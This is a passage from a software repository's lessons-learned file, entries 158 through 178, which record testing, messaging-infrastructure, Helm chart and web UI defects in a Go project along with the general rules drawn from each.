happened here twice in one session.

## 158. Asserting a value rather than a presence is the cheaper test and the more portable one, because naming where the truth comes from is what gives a test somewhere to skip, and a skip that can fire on the platform the evidence came from needs a control of its own

**The incident.** `internal/catalog/facts` has thirteen tests. Twelve computed their
expectations by reading the same source the method reads, through helpers that `t.Skipf` when
this machine cannot answer. One asserted only that two keys were present in the result map. That
one was the only test in the package to fail on the CI matrix's macOS leg, and it failed for a
reason that was not a defect: macOS has no `/etc/os-release`, the method correctly emitted no
fact for it, and the test had no way to know the question was unanswerable here. See
`FAILURE_PATTERNS.md` #187.

The guard the other twelve had was not designed as a guard. It is a side effect of how they
state their expectations: to compare a value you must say where the true value comes from, and
saying so is what gives you somewhere to notice it is missing. The presence assertion skipped
that step, so it had nothing to notice.

That makes the weaker assertion the less portable one, which is the part worth carrying
forward. It is easy to read a presence check as the conservative choice, fewer commitments,
less to break across environments. It is the opposite. A glob that selected the right two facts
and filled them with wrong values passed this test for as long as it existed, and the same
missing commitment is what made it the one test that could not survive a different host.

**The second half, which the fix created rather than closed.** Once that test skips politely,
the macOS leg reports `ok` for the package while three of fourteen tests never run, including
the happy path. Nothing shows it: `go test` prints SKIP only under `-v`, neither `make
test-race` nor `make test-no-docker` passes `-v`, and the coverage floor cannot catch it either,
because a skipped test's lines were never counted in the first place. A `t.Skipf` is invisible
to every gate this repository runs, in exactly the way `FAILURE_PATTERNS.md` #179 observes of a
port with no callers.

So the skip needed a boundary. `TestGather_LinuxAnswersEverythingThisSuiteWouldOtherwiseSkip`
makes the identical missing file a **failure** on Linux, the platform all these facts were
recorded against and the only leg running the full `make ci`. macOS keeps skipping, legitimately
and for a documented reason; Linux loses the ability to skip silently. This is the same
reasoning `.github/workflows/ci.yml` already applies to socat, which it installs on both legs
precisely so that an `exec.LookPath` skip cannot drop real evidence without failing anything.

**The rule.** Prefer asserting the value over asserting the presence: it is a stronger check and
it is what earns the test an honest skip, because naming the source of truth is the same act as
learning when there is none. Then treat every `t.Skipf` as conditional coverage that some
platform is relying on, decide which platform is allowed to skip it and which is not, and give
the second one a test that goes red instead. A skip is invisible to `go test` without `-v`, to
the coverage ratchet, and to CI; it will not announce that it started firing where the evidence
was supposed to come from.

## 159. A shared primitive with no removal operation makes every consumer's tests order-dependent and count-dependent, and `-count=1` hides that from every gate you have

**The incident.** `pkg/registry.Registry[T]` is this module's Section 25 shared primitive: one
thread-safe string-keyed table that device types, capabilities, Collection methods, sync plugins,
launch kinds, credential targets and the web UI view registry all build on instead of hand-rolling
a map. It shipped with `Register`, `MustRegister`, `Get` and `All`. It shipped with no way to
remove anything, and neither did any of its eight consumers.

That is a perfectly reasonable production API -- nothing in a running controller should ever
unregister a built-in. It is also the reason nine packages could not run their own tests twice in
one process, twenty-four tests, two of them panicking outright. See `FAILURE_PATTERNS.md` #188.

The part worth generalising is not the missing method. It is that the absence was invisible to
every automated check this repository runs. `go test` defaults to `-count=1`, so `make test`,
`make test-race`, `make test-no-docker` and all three CI legs had only ever measured one iteration
of each test, forever. Coverage says nothing, because the lines do run. `go vet` has no opinion.
`internal/archtest` had no rule, and could not easily have had one, because the defect is not
visible in the shape of any single file: a test calling `Register` is correct, and it is only
incorrect in combination with the fact that nobody ever calls it twice.

`internal/launch` is the instructive case, because it had already noticed the problem and its fix
looked right. It named its test kind after `t.Name()`. That de-duplicates the two tests in the
file against each other, and does nothing at all against a second iteration of the same test:
Go's `testing.matcher` makes SUBTEST names unique with a `#01` suffix, never top-level ones. A
guard that reasons about the wrong axis is worse than no guard, because it stops the next reader
from asking the question.

The second half arrived from going one step past the new gate. With `-count=2` clean everywhere,
`-count=4` failed a tenth package for an entirely different reason: `pkg/remoteexec`'s circuit
breaker is process-wide and keyed by address, so four consecutive dial failures to this
repository's standard "nothing can listen here" address opened it and changed the error message a
test was asserting on. Same shape -- process-wide state outliving the test that touched it --
reached through a production singleton rather than a registry, and invisible for the same reason.

**The rule.** When you build a shared primitive that holds process-wide state, decide at the same
time how a test puts it back, and treat "no consumer should ever need this in production" as an
argument about naming and access, not about whether the operation should exist. Then make the
absence detectable: a `-count>1` run is cheap (115s against 90s across 187 packages here) and it is
the only check that can see this entire class, including the variants no AST rule can reach, such
as a leaked database row or an open circuit breaker. Where the seam has to be exported surface
because `export_test.go` cannot cross a package boundary, ship the AST rule forbidding production
callers in the same commit, per #156 -- and control it live by adding a real violation and watching
it go red, not by asserting it works.

## 160. A coverage drop straight after an isolation fix is usually a test that was only ever covered by another test's leftovers

**The incident.** Cleaning up leaked registry registrations (see `FAILURE_PATTERNS.md` #188) put
`internal/inventory/syncplugin` below its recorded coverage floor, 95.0 against 95.6. Nothing had
been deleted and no test had been weakened on purpose, so the obvious reading was that the floor
needed re-baselining down by half a point.

That reading was wrong, and the uncovered line said so: the loop body inside `Names()`, which
appends each registered plugin name before sorting. `Names()` was being called against an EMPTY
registry.

`TestNames_IsSorted` had never registered anything. It called `syncplugin.Names()` and checked the
result was ordered, and in that package's own test binary the real plugins are never linked at all,
because they live in `internal/inventory/plugins`. So it had been asserting over whatever earlier
tests happened to have left in the process-wide registry. Take the leftovers away and it asserts
over an empty slice: a sort test whose loop never runs, passing for a reason that has nothing to do
with sorting. It now registers three plugins in an order that is not the sorted one, and the
coverage came back on its own.

The general shape is worth naming. An isolation fix does not usually change what a test executes;
it changes what the test can SEE. Any coverage that disappears was therefore coverage produced by
cross-test pollution, which means some assertion was reading state its own test did not create. The
number going down is the only signal, and it arrives looking exactly like a fix that overreached.

**The rule.** When coverage falls after a test-isolation change, do not re-baseline the floor. Find
the specific lines that stopped executing and ask which test used to reach them and how, because
the answer is almost always a test asserting over state some other test left behind, and that test
was weaker than its name claimed for as long as it has existed. Fix it by giving it its own data.
The floor doing its job here is the argument for a coverage ratchet being per package and hard to
lower: a global percentage would have absorbed this without anybody noticing.

## 161. Asserting that a callback is registered is a tautology about a struct; capture what it writes, or the observability half of a phase is unverified

Phase 96a's third measured defect was that a lost NATS connection produced no log
line at all. The fix registered lifecycle handlers; the test asserted
`opts.DisconnectedErrCB != nil` and three siblings, all of which passed
immediately and none of which executed a single handler body.

Two real defects lived inside those bodies and shipped through review. The
disconnect handler logged `url=""` on every disconnect, because the library has
already left CONNECTED by the time it runs. And a graceful `Close()` fired both the
disconnect and the closed handler, so every deliberate shutdown emitted a WARN
saying "reconnecting" and an ERROR saying "closed permanently", six false lines per
pod on a rolling update. Both are visible in one line of captured output and
invisible to any number of non-nil assertions.

The general shape: a non-nil check on a function value proves the wiring and
nothing about the behaviour, which makes it the exact analogue of a test that
asserts a handler is mounted without issuing a request. It is worse than a missing
test, because it is counted as the test. Where the deliverable is "this is now
observable", the assertion has to be on the observation: capture the writer, run
the real event, and read the text. This repository already knew the principle under
RULE 0; what this entry adds is that a registered callback is a mock of itself.

Corollary worth keeping: the evidence was already on disk. The phase's own
long-severance test log contained both bad lines, at the same second as the test's
own cleanup, and they were read as ordinary shutdown output. Output a test emits
but does not assert on is not evidence, because nobody reads it until it is too
late.

## 162. Client-side resilience is only as long as the shortest supervisor timeout above it, and those timeouts are usually chosen by someone else

Phase 96a gave every NATS connection an unlimited reconnect budget, closing a
defect where a link outage past 2m3s killed a Runner permanently. The Helm chart
that ships the Runner kills the pod after 60 to 105 seconds of broker
unreachability, because its liveness probe reads a heartbeat that only advances
when the broker answers.

So the shipped default cancels most of the new capability, and cancels it
*sooner* than the defect it replaced: the client will now reconnect after an hour,
and the orchestrator will not let it live that long. The restart also abandons
in-flight work, which is the thing the resilience was meant to protect. Neither
number is wrong on its own. The probe interval was chosen when an unreachable
broker really did mean a dead process, and it was correct then.

The rule: when you extend how long a component tolerates a failure, enumerate every
timeout above it that can end the process first, and either move them in the same
change or state in the shipped artifact that you did not. A capability that exists
in the binary and is cancelled by the deployment is worse than one that does not
exist, because the datasheet claim is true of the code and false of the product.

In this case the honest resolution was to name it in the chart and the operator
documentation and hand the derivation to the phase that owns a single
maximum-survivable-outage budget, rather than guessing a new liveness window to
match a resilience window that had itself not been derived from anything yet.

## 163. Narrowing who may write shared infrastructure is a worse fix than removing the ability to change it, because the first buys ordering and the second is free

Phase 96b was specified as "the Controller owns the stream; Runners attach and
refuse to start without one." That is the intuitive reading of single ownership,
and it is the expensive one. It buys a start ordering that neither shipped
deployment expresses, it turns a destroyed stream into a permanent outage
(because a running Controller provisions once at startup and never re-asserts,
so nothing recreates what was lost), and it does all that in exchange for a
property the system cannot yet observe, since no configuration surface for the
shape exists until a later phase.

The fix that costs nothing is to change the VERB rather than the ACTOR. Every
process may create the object when it is absent; only one process may reshape
one that exists. The defect being closed is "an older build silently reverts an
operator's choice", and that is a property of the reshape path, not of the
create path. Removing the reshape path from the other binaries closes it
completely, while leaving create-if-absent everywhere preserves self-healing and
start-order independence untouched.

The general form: when a shared resource has several writers and that is a
defect, ask which OPERATION is the defective one before deciding to reduce the
number of writers. Reducing writers introduces coordination, and coordination
introduces ordering, availability coupling, and a new class of failure at
startup. Removing a capability introduces none of those. This codebase had
already discovered this once, in `internal/tlscert`, where several controllers
sharing one certificate directory converge lock-free by reading first and
writing only what they find unusable, and the chart documents the resulting
property in plain words: none of them waits on another.

A corollary worth keeping: "single writer" is usually a fiction anyway. The
Controller in this system autoscales to five replicas, so narrowing three
binaries to one binary would have narrowed the writer count from three to five.
Leader election does not rescue it either, and this repository already says so
about its own election: leadership bounds how many replicas act, it does not
make an action unique, which is why schedule firing relies on a database unique
index instead of on the lease.

## 164. During a rolling upgrade, the thing worth building is the warning, not the enforcement

Every ownership design for shared infrastructure has a window it cannot cover:
the rollout itself, when old and new builds are both running and disagree about
what the shape should be. Enforcement does not help there. An old build that has
been stripped of its ability to reshape is no longer doing damage, but it is
also not applying the new shape, and nothing in the system would say so. The
operator sees a successful deploy and a configuration that is not in effect.

So the deliverable that actually covers the gap is a read-back and a warning:
after binding to the shared object, compare its live shape against what this
binary declares and log every field that differs. It costs one round trip that
the bind already made, it works in both directions (an old build noticing a new
shape, and a new build noticing an old one), and it is the only signal that
exists during the exact window the ownership rule cannot reach.

Two details decide whether the warning is useful or noise. Compare only the
fields this project DECLARES: a driver's configuration struct usually carries
many more, the server fills the rest with its own defaults and returns them, and
a whole-struct comparison fires against a perfectly healthy cluster that this
same code just provisioned. And compare order-insensitively where the server is
free to reorder, because an ordering difference is not a configuration
difference. A warning that fires constantly is worse than none, because it
trains the reader to ignore the one that matters.

## 165. A derived constant needs its non-linear cap in the derivation, not in a comment, because the linear case is the one that looks safe

Phase 96c replaced three independent retention literals with derivations
from one stated outage budget. Two of the three scale linearly and are
uninteresting. The third, the stream's duplicate window, must NOT: a
separate mechanism, the stale-job reclaim, republishes after ten minutes
and its own doc comment explains that this is safe "precisely because it is
not a retry within that window". A duplicate window grown past the reclaim
interval would silently convert that republish from a fresh delivery into a
suppressed duplicate, so a stranded job would stop being recovered at all,
with no error anywhere.

The dependency was written down, in prose, in the right file, by someone who
understood it. That was not enough, because the prose lived in the consumer
of the constant and the constant was about to become configurable in a
different package. What makes it safe is that the cap is inside the
derivation function and asserted by a test that runs the minimum, the
default and the maximum budget through it.

The general rule: when a value becomes derived, enumerate everything that
depends on its current magnitude rather than on its identity. A dependency
on magnitude is invisible to every tool, survives review because the code
that relies on it does not mention the constant by name, and breaks only at
a value nobody has tried yet. If a derivation has a cap, the cap belongs in
the function, and the reason belongs in a test, because a comment cannot
fail.

## 166. Producer-side idempotency is only as good as the gap between the original and the retry, so measure the gap rather than checking the key

This codebase had a retry-stable idempotency key, correctly derived, stamped
on every dispatch publish, reaching the driver's own duplicate suppression.
Every piece was right, and the mechanism had read as complete for several
phases.

It protected nothing, because the window was two minutes and the only thing
that ever re-issues an unconfirmed dispatch is a reclaim that fires after
ten. The dedup memory expired eight minutes before the duplicate it existed
to catch. Nobody had compared the two numbers, because they live in
different packages and neither mentions the other.

Lengthening the window was not available either: the reclaim's own
correctness depends on the window having closed by the time it runs. So the
answer was a second mechanism at the consumer, keyed on the same identity,
with a lifetime governed by something other than the stream.

The rule to carry: when reviewing an idempotency story, do not stop at "is
the key stable". Ask what actually retries, how long after the original,
and whether the suppression is still remembering by then. Write the gap and
the window next to each other, because they are almost never in the same
file and the comparison is the whole of the argument.

## 167. A configuration string that selects a transport needs an allowlist, because the library's default for an unrecognised value is the insecure one and it never errors

`NATS_URL` reached the driver unvalidated for the whole life of this
project. The scheme in that URL is not decoration: it chooses between
plaintext TCP, TCP with TLS, and two WebSocket variants. `nats.go` treats a
value with no scheme as plaintext, so `broker.example.com:4222` connects
and works and is unencrypted, and so does a mistyped `tsl://` or a copied
`https://`. Everything succeeds. The operator's intention to encrypt is the
only casualty and nothing reports its loss.

Two properties make this class worth a rule. The failure is silent in the
insecure direction, which is the opposite of how a parse error usually
behaves. And no automated gate can see it: there is no type to constrain,
every value is a legal string, and a security scanner has no model of what
this particular string means.

So: whenever a configuration value selects a transport, a codec, a cipher,
an auth mode, or a protocol version, write the allowlist. A denylist admits
everything nobody thought of, which is exactly the set a typo lands in.

The second half of the rule is where to enforce it. Put the check at the
single chokepoint every caller shares, not at each entry point that reads
configuration. Here the entry points were two composition roots reading an
environment variable, and a third that reads no environment at all and
dials a hardcoded default. An env-level check would have covered two of
three and skipped the one nobody watches. The dial function all three call
covered all of them and cannot be bypassed by a fourth caller written later.

## 168. Rendering without an error is not evidence a chart is correct, because a mount without its volume is valid YAML

Adding broker TLS to a Helm chart meant a new ConfigMap, a Secret mount and
matching `volumeMounts`. The StatefulSet's `volumes:` key turned out to
exist in only two mutually exclusive branches, and the DEFAULT
configuration takes neither, because a StatefulSet with managed persistence
uses `volumeClaimTemplates` and needs no `volumes:` entry at all. The new
volumes went into the branch that looked like the main one, and rendered
perfectly, with mounts and no volumes, on the path an operator would
actually use.

`helm template` reported success because the output was structurally valid
YAML. Kubernetes would have rejected it at apply, in a cluster, later.

Two habits come out of this. Before adding a volume, enumerate every branch
in which the `volumes:` key does and does not exist, and remember that a
StatefulSet has a third state in which it exists in neither. And verify a
MATRIX rather than a sample, asserting the mount and its volume together:
the assertion has to be "both are present", because "no error" is satisfied
by exactly the broken case. When a chart's structure forces the same list
into two places, put the shared part in a named template so the two cannot
drift, which is the same reasoning that applies to any duplicated
declaration.

## 169. A hazard closed in one function is not closed in its siblings, and a latent one reads as no hazard at all

`internal/topology.DurableName` was written with an explicit doc comment
explaining that sanitizing a caller-supplied string is not enough on its
own, that two inputs differing only in illegal characters must not collapse
onto one output, and that this is a Schema/Injection Hardening concern
rather than a naming convenience. It cites `FAILURE_PATTERNS.md` #18, which
is the same class: an unvalidated id widening a NATS subject.

Three functions in the same file, a few dozen lines away, concatenated a
caller-supplied string straight into a subject with none of that.
`LogSubject(jobID)` and `ResultSubject(jobID)` did it, and `DispatchSubject`
avoided it only because it took no parameter at all, which was itself the
defect Phase 101a existed to fix.

What kept it invisible for several phases is the part worth carrying
forward. Job ids are `uuid.New().String()`, so nothing illegal ever reached
those two in practice, and a hazard that cannot currently fire looks
exactly like a hazard that does not exist. Nobody reading the file saw a
bug, because there wasn't one yet. The device id was the input that would
have fired it: `pkg/inventory` documents it as opaque and operator-supplied,
so an entirely ordinary `router1.example.com` would have expanded a
three-token subject into a six-token one.

One correction belongs here rather than in a quiet edit, because the
overstatement is itself an instance of the lesson. This entry first claimed
such a subject would match no filter this package declares and would
silently stop that device being dispatched to anybody. That is false. The
fleet filter ends in `>`, which matches one or more trailing tokens, so the
dispatch would have been delivered normally; a single-token `*` filter is
what receives nothing. Both halves were verified against a real broker
rather than reasoned about, and the reasoning that produced the wrong
version was the same shortcut the rest of this entry is about: an
unexamined assumption about how something behaves, believed because it made
the story tidier. What an over-wide id actually breaks is every
single-token per-device filter, which is the scoping mechanism the next
stage depends on.

Two habits come out of it.

When a function is hardened against an input class, look for every sibling
that takes the same shape of input, and judge them by the input they COULD
receive rather than the input they currently do. The reason `DurableName`
was hardened applies to any caller-supplied string becoming a NATS
identifier, and the file it lives in held three more of them.

Put the mapping inside the builder rather than at its callers. The subjects
here are written in one process and read in another: the Runner publishes a
job's log lines and the Controller's SSE viewer subscribes to them. Sanitize
at the call sites and the two processes agree only for as long as every
caller remembers; sanitize inside `LogSubject` and they agree by construction,
and the change costs zero call-site edits. The corollary is that the
exceptions then have to be loud, because they look like oversights:
`DeadLetterSubject` and `EventSubject` both receive an already-dotted value
on purpose, and each now says so in its own comment, or the next tidy-up
"fixes" them and breaks the dead letter path.

## 170. An identity-function diagnostic exonerates only the call sites a value flows through, because identity makes a wrongly passed argument accidentally correct

FAILURE_PATTERNS.md #206's first fix split `internal/lock`'s NATS adapter
into an itemID (what the caller passed, what `ID()` returns) and a stored
key (the encoded value every broker operation uses). It failed against the
conformance suite in a way that read as a broker mystery: shared-mode
churn collapsing with "key not found" and "lease is no longer current"
while, apparently, every call site used the encoded value.

Two diagnostics were run, and both produced answers that were precisely
wrong.

Setting the encoder to the identity function made the suite pass, which
was read as "the refactor is correct, the encoding breaks it". But the
refactor had missed three call sites: `publishWithTTL`, which hand-builds
the "$KV.<bucket>.<key>" subject, had four callers, and three still passed
the lease's raw `itemID`. Under identity, itemID and key are equal, so a
wrongly passed itemID lands on the right subject anyway. Identity does not
exercise a split; it erases it. A diagnostic input with a fixed point at
the bug's location cannot see the bug.

Substituting `itemID + "-x"` for the real encoder failed identically to
it, which was read as "any deviation of key from itemID breaks it, so the
cause is in shared-mode CAS, not the encoding". The correlation was
perfect and the conclusion inverted: ANY non-identity encoder exposes the
three missed sites equally, because what breaks is the disagreement
between the switched sites and the missed ones, not the encoding itself.

The observed failure mechanics, for the record: the three missed publishes
carried CAS expectations taken from the encoded key's revision history to
the raw-itemID subject, which could never satisfy them, so every
TTL-refresh spun in its retry loop until the never-refreshed 5s per-key
TTL expired the lock underneath it. A fourth distortion stacked on top:
"exclusive mode untouched" came from reading a `tail -4` of the output
while the exclusive KeepAlive conformance failure scrolled past above it,
believable because every lifecycle test of exclusive KeepAlive asserts a
failure path and none asserted that a healthy refresh actually lands.

The resolution came from refusing to trust the recorded reading: the
attempt was reconstructed exactly from the session transcript, reproduced
against a real broker, and fixed by switching only the three missed sites.
The shipped form then retired the whole error class instead of the one
instance: the encoded key is a distinct Go type (`storedKey`), the
subject-building functions accept only it, and passing a raw itemID where
a key belongs became a compile error, which was verified by writing that
exact mistake and watching the build refuse it.

The rule: when a diagnostic simplification makes a failure disappear, ask
what else it made equal before believing what it seems to isolate. An
identity function, a shared fixture, a zero value, a same-string rename:
each collapses a distinction, and any bug living exactly in that
distinction is invisible under it. Prefer a probe that keeps every
distinction and varies one (here: the real encoder with one call site
switched at a time), and when two variants "fail identically", diff the
failure MECHANISM, not just the failure count, before concluding they
share a cause. And when a mistake is one a comment must warn against,
give the two things different types so the compiler runs the sweep every
build, on every site, including the ones nobody re-read.

## 171. A gate proves the intersection of what the code does and what the fixture is configured to allow, and a permission list asserted against a restatement of itself asserts nothing

Phase 101b shipped five defects behind a Release Gate that passed in twelve
seconds and a unit test that passed on every one of them
(`FAILURE_PATTERNS.md` #207). Both were written carefully. Both were
structurally incapable of failing.

The gate ran a real broker, in operator mode, with real minted credentials,
in acts, with a control proving anonymous access was refused and a negative
control proving a forged publish was denied. By every convention in this
repository it was a good gate. Its broker ran without `-js`, and all five
defects lived on the JetStream control plane.

That is the first rule, and it is not about NATS. A gate measures the
INTERSECTION of what the code does and what the fixture is configured to
exercise. A fixture missing the subsystem the code exists to serve turns
every assertion into a statement about the other subsystem. The question to
ask of a fixture is not "is it real" but "is it configured like the thing
it stands in for", and the specific form here is worth keeping: the only
NATS start in the entire repository that omitted `-js` was the one gating
the code whose whole purpose was JetStream permissions.

The unit test failed differently and worse. It compared the grant against a
hand-written list of the subjects the Runner needs, by exact string
membership. The list was written in the same sitting as the grant, from the
same misunderstanding of a wildcard, so it carried the identical wrong
suffixes. It asserted that the grant equalled itself. A test written from
the same source as the code under test inherits the code's errors, and
inherits them invisibly, because both sides move together whenever anyone
changes them.

The repair generalises. Assert against the OTHER SIDE OF THE CONTRACT: the
subject the driver actually sends, taken from the driver's own templates,
matched by the matching rules the server actually applies. That turns a
comparison between two copies of one belief into a comparison between a
belief and an independent fact. And when the matching rules are themselves
the thing misunderstood, pin them in their own table first, with the case
that caused the bug written as a row (`a.b.>` does not match `a.b`), so the
helper cannot quietly drift into agreeing with a broken grant.

Both failures share one ancestor: a check that cannot distinguish success
from its absence. #206 met the same shape a week earlier, where an
identity-function diagnostic made a wrongly passed argument accidentally
correct (#170). The habit that catches all three is to ask, of any passing
check, what would have to be true for this to fail, and to go and make that
true once.


---

## 172. A "no input substring survives" assertion needs an empty-input baseline as its control, or it is unusable and gets deleted

Phase 40's run journal is built on the claim that no value a device produced
can reach a journal entry. The design note asks for a fuzz target that
states that as a property: marshal the produced entries and assert that no
substring of any input value survives.

Written literally, that assertion cannot be shipped. A journal entry
serializes to field names, JSON punctuation, closed-enum values, fixed
platform identifiers and a zero timestamp, and a short fuzzed input
collides with those constantly and meaninglessly. An input of `a` is a
substring of `TaskName`. An input of `0001-01` is a substring of the zero
time. Neither is a leak, and neither is worth an exception, because the
exceptions accumulate until the rule is mostly exceptions and someone
deletes it.

The previous increment reached the same wall and answered it by dropping
the substring property entirely in favor of a whitelist: every field of the
produced entry must be drawn from an enumerable set. That is the stronger
property and it stays the primary one. But it can only check the fields
whoever wrote it thought to check, and the failure this whole phase guards
against is a field a LATER phase adds.

The repair is a control rather than an exception list. Run the projection
once with entirely empty input and marshal that. Anything already present
in the result cannot have come from the input, so it is explained once, by
construction, instead of case by case forever. What the baseline does not
explain is explained by a second, small, enumerable alphabet: the names the
projection is independently allowed to store, for the case where a fuzzed
value happens to spell a registered method name or a declared key. Anything
explained by neither is a leak.

Two details make it work rather than merely look like it works. Both the
entry and each needle go through `encoding/json`, so a value carrying a
quote or a control byte is compared in the same escaped form the entry
holds it in; searching for a raw input inside escaped output silently
misses most of what a fuzzer produces and all of what a running-config
contains. And the whole helper carries its own negative control, asserting
that an arbitrary value is NOT explained while a resolved method name and a
field name ARE, because a property test that cannot fail is
indistinguishable from one that passes.

It earned its place immediately. A deliberately planted leak, a skip's
reason sentence copied into the entry's `DeviceID`, was invisible to the
whitelist (which did not inspect a skipped entry's device) and was reported
by the substring property on the first seed.

The general form: when a property is stated as "X must not appear in the
output" and the output has structure of its own, the control is not a list
of allowed exceptions, it is a run of the same code with X removed.

## 173. A tooling mandate a rules file states in prose is not in force until something wires the tool in and something else can fail when it is missing

This repository has told every agent to prefer the language server over
grep since the IDE & LSP Tooling section was written. The rule was correct,
the reasoning under it was correct, and it was written in the imperative.
None of that put it in force. It named `gopls references` and `gopls
definition`, two command line invocations, and it offered `gopls version`
as the way to confirm the tool before relying on it. Those three facts
between them are why the rule was followed unevenly for months.

`gopls version` is the part that looks like a check and is not one. It
prints a string from a binary that is on PATH. It does not prove the binary
can load this module, which is the only thing anyone actually wants to
know, and which fails for its own reasons: a gopls older than the toolchain
`go.mod` asks for will print its version happily and then type-check
nothing. A check that cannot distinguish a working setup from a broken one
is not a weak check, it is a green light wired to nothing, and this
repository already knows that shape from a permanently red CI gate gating
nothing.

The command line invocations are the part that made following the rule
expensive. Each `gopls references` is a cold start that loads and
type-checks the workspace again, which here is several seconds for one
question. An agent under any time or token pressure that pays that per
query, against a grep that answers instantly, will drift to grep and
produce exactly the guesses the rule was written to forbid. The mandate was
asking for the more expensive tool without noticing it was doing so.

Both are fixed by the same thing, which already existed and was not wired
in: `gopls mcp`, the language server's headless MCP mode. `.mcp.json` in
the repository root exposes it, so a session holds one warm server for its
whole life and eight typed queries cost a fraction of a single cold CLI
invocation. That inverts the pressure the rule was fighting, because the
correct tool is now also the fast one and the cheap one. `go_package_api`
returns a package's exported surface in a screen or two where reading that
package to learn the same thing costs thousands of lines of context, so
following the rule now saves the budget that breaking it used to save.

And `make lsp` is the check that can fail. It is a real MCP handshake that
ends in a `go_workspace` call and greps the reply for this module's path,
so it goes red on all three ways the setup breaks: gopls absent from PATH,
gopls not speaking the protocol, gopls unable to load this tree. It is
about a second on a warm cache and it was tested against a deliberately
wrong module path before being believed, on the same principle as the
negative control in 172: a check nobody has watched fail is indistinguishable
from a check that cannot.

It stays out of `make ci` on purpose. CI never invokes gopls, gopls is
deliberately the one tool here that is not version pinned for exactly that
reason, and a target whose whole job is to describe a developer's own
machine has nothing to say about a hosted runner.

The general form: a rule that depends on a tool has three parts, and prose
is only the first. Wire the tool in so following the rule is the path of
least resistance, and give the setup a check that has been seen to fail.
A mandate whose tool is unreachable does not produce careful work, it
produces a silent fallback to whatever was reachable, plus a rules file
that reads as though it had not.

## 174. A fixture that holds one of a defect's two conditions proves nothing about the defect

Phase 40's run journal shipped with two structural archtests, a fuzz target, a
benchmark, a Crawl-tier Release Gate against a real sshd, and a Walk-tier gate
against real NATS and real containers. All of them green. The human dogfood pass
then found two real defects inside twenty minutes, and the more serious one
(`FAILURE_PATTERNS.md` #209) was invisible to every one of those tests for a
reason worth generalizing.

It needed two conditions at once: a job dispatched to MORE THAN ONE device, and a
node that resolves NO device (a skipped task, a controller-side task, or the
synthetic parallel marker). Each condition on its own is well covered. The
Walk-tier gates dispatch one device and exercise failures, redelivery to
exhaustion and the unique index. The engine's own tests cover skipped nodes in
detail, including the ordinal and total a `when` list reports. Neither suite has
a fixture holding both, so the store's row identity silently collapsed two
devices' copies of one skipped node into a single row, and no assertion anywhere
was in a position to notice.

This is not a gap in diligence. It is the shape of test suites: a fixture is
built to isolate the thing under test, so it holds one condition and neutralizes
the rest. The consequence is that a suite is systematically blind to defects
that live in the INTERSECTION of two conditions its fixtures each hold
separately, and the suite's greenness carries no information about that region at
all.

Two practical rules follow.

First, when reviewing a mechanism, list the conditions its fixtures neutralize
rather than the ones they exercise, and ask which PAIRS of those are reachable in
production. Here "more than one device" and "a node with no device" are both
ordinary; their combination is a fan-out with a `when:` on a task, which is
about as common as runbooks get.

Second, this is what a dogfood pass is FOR, and why it cannot be replaced by
running the suite again. A person using the product does not build fixtures. They
write the runbook they actually wanted, against the fleet they actually have, and
that runbook carries every condition at once by default. The spec's own stated
reason for the step (`register_mask` once shipped with every one of its own tests
green while masking nothing, because every test shared the wrong path assumption
the bug had) is the same observation from the other side: a suite agrees with
itself, and only use disagrees with it.

The dogfood pass that found these also CONFIRMED several claims that could
otherwise only be asserted, which is the other half of its value: a SIGINT to a
real `pleiades run` mid-level discarded the terminal's entire output and kept
every completed level in the journal file, exactly as the design says; the
documented `jq` recipe works verbatim; and five sentinel values planted through
four separate routes reached the device and reached `--verbose`, and reached
neither journal.

## 175. A declared skeleton that says only "not implemented" cannot be reviewed

The seven `StatusDeclared` views each rendered one sentence: the view is registered, no
port serves it. That is honest, and it is the smallest useful thing that could have been
said. A reader evaluating whether Projects is the right shape, or whether Instance Groups
should carry Instances and Jobs, got nothing to react to. The shape was therefore going to
be decided by whoever eventually wrote the port, at the point where changing it costs the
most.

Everything needed to say more was already in the declaration. `Register` validates a
declared view's fields exactly as it does an implemented one's, so the columns were real,
checked, and rendered nowhere. The change was to render them: a declared region now shows
the column headers it is going to have with the not-implemented panel sitting inside them,
and a declared view lists the tabs a record of it will carry. `view.Planned` builds a
section that has a full field list and no port, and the seven views now declare the tab
sets their AWX counterparts carry.

The empty text carries the other half. "Not implemented" is not actionable; "a schedule
attaches to a template, which is the only Launchable kind there is, and a project sync is
not one yet" tells a reader exactly which decision is blocking it and lets them disagree
with it. Every planned section names the specific thing that is missing, and several of
those sentences are the clearest statement of a platform gap anywhere in the codebase.

**Rule.** Declare the whole shape, not the absence. A skeleton that renders its future
columns, its future tabs and the specific reason each is empty is a design somebody can
argue with before it is built; one that renders an apology is a decision deferred to
whoever writes the port.

## 176. Two nearly identical templates diverge toward the copy with fewer readers

The collection table and the related-record section table were two blocks of markup with
the same header loop, the same `data-label` attributes, the same badge handling and the
same mobile-card treatment. Nearly identical, not identical: the collection copy built
links for fields declaring `References` and the section copy did not.

The consequence was invisible for as long as it existed. A job's device outcome named a
device and could not reach it. A template's Access row named a team and could not reach
it. The detail list had the same gap in a third copy, so a record's own fields named its
inventory and its organization in plain text. The drill-down stopped at whichever record
you opened first, and nobody noticed, because the two copies were never read side by side
and each looked complete on its own.

Collapsing them into one `TableModel` and one `dataTable` component fixed all three at
once and made the fix impossible to half-apply: the section table gained reference links
the moment it stopped being a second implementation.

**Rule.** When two templates are nearly the same, the difference is a defect in the one
with fewer readers, not a variation. Unify them and let the shared component carry every
capability, rather than maintaining two careful copies that will drift again in the same
direction next time.

## 177. A redirect that keeps only the path is a bug waiting for state to move into the query

`safeReturn` parsed the `Referer`, discarded scheme, host, userinfo and fragment, cleaned
the path and required it to sit inside the UI prefix. Discarding rather than validating is
the right posture for an open-redirect defence and the test suite proves it against
seventeen techniques. It also discarded the query string, which was invisible and correct
for as long as every page's state lived in its path.

Adding record tabs and list cursors moved state into the query, and the same helper
silently became a bug. Changing the theme from page four of a list returned the reader to
page one. Toggling accessibility mode on a record's Access tab returned them to its first
tab. The helper had not changed and nothing failed; the meaning of "the path" had changed
underneath it.

The fix keeps the discard-don't-validate posture and adds an allowlist of the four
parameters this UI's own handlers read, which is the rule `refreshURL` in the same package
had already written down: a URL this application builds is built from what it parsed, never
from what it was sent.

**Rule.** A helper that reduces a URL to part of itself encodes an assumption about where
state lives. When state moves -- into a query, a fragment, a header -- every such helper is
a silent bug until re-read. Grep for the reducers when you move state, because none of them
will fail.

## 178. A control for someone who cannot use the page must not require using the page

Accessibility mode was reachable from the sidebar on every page, and its route sat behind
`requireSession` with every other write. That is the correct default for a write, and it
was the wrong answer here: the control renders on the sign-in page, where it posts to a
route that refuses it.

The failure is worse than a broken button. Accessibility mode exists for somebody who
